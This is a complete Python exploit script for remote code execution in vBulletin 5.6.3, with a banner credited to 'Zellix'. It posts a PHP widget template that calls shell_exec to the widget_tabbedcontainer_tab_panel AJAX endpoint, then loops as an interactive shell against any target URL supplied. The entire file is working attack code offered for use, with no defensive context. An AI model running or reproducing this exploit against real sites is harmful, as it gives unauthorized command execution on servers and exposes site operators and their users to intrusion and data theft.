#!/usr/bin/env python3
# vBulletin 5.6.3 widget_tabbedContainer_tab_panel RCE exploit by @Zellix fork @zenofex

import argparse
import sys
import requests
import os

os.system("cls")
red = '\033[1;31m'

print ('''%s
 __     ______        _ _      _   _         ____   __    _____ 
 \ \   / / __ ) _   _| | | ___| |_(_)_ __   | ___| / /_  |___ / 
  \ \ / /|  _ \| | | | | |/ _ \ __| | '_ \  |___ \| '_ \   |_ \ 
   \ V / | |_) | |_| | | |  __/ |_| | | | |  ___) | (_) | ___) |
    \_/  |____/ \__,_|_|_|\___|\__|_|_| |_| |____(_)___(_)____/ 
                                                                
    [========[{+}]Made By Zellix[{+}]========]\n
''' % red)

def run_exploit(vb_loc, shell_cmd):
    post_data = {'subWidgets[0][template]' : 'widget_php', 'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd}
    r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)
    return r.text

ap = argparse.ArgumentParser(description='vBulletin 5.6.3 Ajax Widget Template RCE updated')
print("\033[1;31mExploit: /ajax/render/widget_tabbedcontainer_tab_panel\033[1;32m\n")
ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse_args()
print("Good, you are in cmd now")

while True:
    try:
        cmd = input("vBulletin5$ ")
        print(run_exploit(ARGS.location, cmd))
    except KeyboardInterrupt:
        sys.exit("\nClosing shell...")
    except Exception as e:
        sys.exit(str(e))
        print("Updated by Zellix for new update")